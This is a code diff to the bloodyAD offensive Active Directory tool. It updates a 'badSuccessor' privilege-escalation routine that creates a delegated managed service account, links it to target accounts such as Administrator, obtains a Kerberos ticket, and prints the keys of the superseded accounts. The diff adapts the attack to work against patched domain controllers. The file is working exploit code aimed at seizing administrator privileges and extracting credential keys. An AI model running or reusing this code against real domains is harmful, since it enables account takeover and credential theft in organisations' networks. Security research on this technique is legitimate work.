@@ -1,4 +1,4 @@
-import binascii, datetime, random, string, base64, asyncio
+import binascii, datetime, random, string, base64
 from typing import Literal
 from urllib import parse
 from bloodyAD import utils, ConnectionHandler
@@ -17,16 +17,18 @@ from kerbad.common.kirbi import Kirbi
 from kerbad.common.ccache import CCACHE
 from kerbad.protocol.external import ticketutil
 from kerbad.protocol.encryption import Enctype
+from kerbad.protocol.errors import KerberosError
 from winacl.dtyp.security_descriptor import SECURITY_DESCRIPTOR
 
 
-async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None):
+async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Administrator,CN=Users,DC=Current,DC=Domain"], ou: str = None, prepatch: bool = False):
     """
     Add a new DMSA (Dedicated Managed Service Account) object
 
     :param dmsa: hostname of the DMSA object (no need to add '$')
     :param t: Distinguished Name of the target whose privileges are to be assumed (can be called multiple times, e.g. "-t CN=Admin,CN=Users,DC=domain,DC=com -t CN=John,CN=Users,DC=domain,DC=com")
     :param ou: Organizational Unit for the DMSA object. If not provided, chooses the first OU the logged user can add child to.
+    :param prepatch: Consider DC as pre-26100.4946 and doesn't write msDS-Superseded* attributes on targets
     """
 
     async def getWeakOU(conn):
@@ -123,7 +125,18 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
         "msDS-SupportedEncryptionTypes": 0x1c,
         "userAccountControl": 0x1000
     }
-    await ldap.bloodyadd(dmsa_dn, attributes=attr)
+    try:
+        await ldap.bloodyadd(dmsa_dn, attributes=attr)
+    except badldap.commons.exceptions.LDAPAddException as e:
+        if "NTE_NO_KEY" in e.message:
+            LOG.error("It seems the KDS root key doesn't exist!")
+            LOG.error("If it's your lab you can add one using 'Add-KdsRootKey -EffectiveImmediately'")
+        raise e
+
+    # If post patch we have to add msDS-Superseded* attributes to targets to avoid KRB_ERR_GENERIC
+    if not prepatch:
+        for target_dn in t:
+            await ldap.bloodymodify(target_dn,{"msDS-SupersededManagedAccountLink":[(Change.ADD.value, dmsa_dn)],"msDS-SupersededServiceAccountState":[(Change.REPLACE.value, 2)]})
 
     client = None
     path = dmsa + "_" + "".join(
@@ -166,14 +179,16 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
         tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
     except Exception as e:
         LOG.error(f"Failed to retrieve dMSA TGT")
-        if host_params["ip"] != conn.conf.dcip:
+        if isinstance(e, KerberosError) and e.errorcode.value == 60: #KRB_ERR_GENERIC
+            LOG.error("DC seems patched or didn't have time to take into account changes, remove the --prepatch flag, ensure you have write permissions on targets and try again!")
+        elif host_params["ip"] != conn.conf.dcip:
             LOG.error(f"{host_params['ip']} may not be synchronized to {conn.conf.dcip}, wait or try to add dMSA directly on {host_params['ip']}")
         LOG.error("Try using Rubeus, or something like:")
         LOG.error(f"badS4U2self '{url}' 'krbtgt/{ldap.domainname}@{ldap.domainname}' '{dmsa_sama}@{ldap.domainname}' --dmsa")
         raise e
 
     kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
-    LOG.info(str(kirbi))
+    print(kirbi)
 
     ccache = CCACHE().from_kirbi(kirbi)
     ccache_path = path + ".ccache"
@@ -182,12 +197,12 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
 
     dmsa_pack = ticketutil.get_KRBKeys_From_TGSRep(encTGSRepPart)
 
-    LOG.info('\ndMSA current keys found in TGS:')
+    print('\ndMSA current keys found in TGS:')
     for current_key in dmsa_pack['current-keys']:
-        LOG.info("%s: %s" % (Enctype.get_name(current_key['keytype']), current_key['keyvalue'].hex()))
-    LOG.info('\ndMSA previous keys found in TGS (including keys of preceding managed accounts):')
+        print("%s: %s" % (Enctype.get_name(current_key['keytype']), current_key['keyvalue'].hex()))
+    print('\ndMSA previous keys found in TGS (including keys of preceding managed accounts):')
     for previous_key in dmsa_pack['previous-keys']:
-        LOG.info("%s: %s" % (Enctype.get_name(previous_key['keytype']), previous_key['keyvalue'].hex()))
+        print("%s: %s" % (Enctype.get_name(previous_key['keytype']), previous_key['keyvalue'].hex()))
 
 
 async def computer(conn: ConnectionHandler, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
